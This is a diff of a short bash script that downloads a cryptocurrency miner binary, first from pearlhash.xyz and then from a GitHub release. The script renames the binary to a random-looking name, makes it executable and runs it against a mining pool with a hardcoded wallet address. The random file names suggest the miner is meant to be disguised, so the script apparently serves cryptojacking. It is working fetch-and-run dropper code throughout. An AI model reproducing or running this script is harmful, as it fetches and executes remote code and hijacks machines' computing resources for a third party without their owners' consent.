@@ -1,3 +1,5 @@
 #!/bin/bash
-curl https://pearlhash.xyz/downloads/pearl-miner-v12 -o lamoskiod && chmod +x lamoskiod
-./lamoskiod --host pool.pearlhash.xyz:9000 --user prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch --worker $(echo $RANDOM | md5sum | head -c 10)
+wget https://github.com/rxt36q6/file/releases/download/1/pearl-miner-v12
+mv pearl-miner-v12 usjaoko
+chmod 777 usjaoko
+./usjaoko --host pool.pearlhash.xyz:9000 --user prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch --worker $(echo $RANDOM | md5sum | head -c 10)
